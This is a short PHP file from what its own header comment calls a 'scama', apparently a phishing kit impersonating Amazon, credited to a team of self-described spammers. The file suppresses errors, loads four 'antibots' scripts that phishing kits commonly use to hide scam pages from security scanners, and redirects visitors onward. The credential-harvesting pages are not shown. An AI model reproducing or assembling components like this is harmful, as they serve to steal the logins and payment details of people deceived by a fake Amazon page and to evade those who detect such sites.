<?php
session_start();
error_reporting(0);
/*   
       #===========================================#
       #   scama: Amazon Crew                      #
       #   Team : Dreamhackers                     #
       #   mode : in Moroccan spamer               #
       #   creat : dexter & Patrick & Yassin       #
       #   web : www.facebook.com/dreamdeface.org  #     
       #===========================================#

   Please Don't Talk About Me When I'm Gone Alfred Publishing 
   Please don't forget to click save 
							                         
*/

include "../antibots/antibots1.php";
include "../antibots/antibots2.php";
include "../antibots/antibots3.php";
include "../antibots/antibots4.php";

header("LOCATION: ../../index.php");

?>
